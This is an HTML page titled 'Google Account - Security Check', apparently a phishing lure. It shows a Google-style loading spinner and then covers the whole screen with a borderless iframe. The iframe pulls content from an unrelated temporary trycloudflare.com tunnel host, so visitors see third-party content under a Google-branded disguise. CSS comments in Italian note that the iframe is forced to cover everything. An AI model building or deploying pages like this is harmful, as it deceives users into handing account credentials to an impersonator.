<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>Google Account - Security Check</title>
    <style>
        /* Reset totale per eliminare ogni pixel di margine */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body, html { 
            height: 100vh; 
            width: 100vw; 
            overflow: hidden; 
            background-color: #ffffff; 
            font-family: 'Roboto', Arial, sans-serif;
        }

        .loader-container {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            width: 100vw;
            position: absolute;
            top: 0;
            left: 0;
            z-index: 1;
        }

        /* L'iframe ora è forzato a coprire tutto senza pietà */
        iframe { 
            position: absolute;
            top: 0;
            left: 0;
            width: 100vw; 
            height: 100vh; 
            border: none; 
            display: block;
            z-index: 2;
            background-color: #ffffff;
        }

        .spinner {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #4285F4;
            border-radius: 50%;
            width: 28px;
            height: 28px;
            animation: spin 0.8s linear infinite;
        }

        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        
        .loading-text {
            color: #5f6368; 
            margin-top: 20px; 
            font-size: 14px;
        }
    </style>
</head>
<body>

    <div class="loader-container">
        <div class="spinner"></div>
        <p class="loading-text">One moment...</p>
    </div>

    <iframe src="https://pregnancy-effective-federal-consultation.trycloudflare.com"></iframe>

</body>
</html>
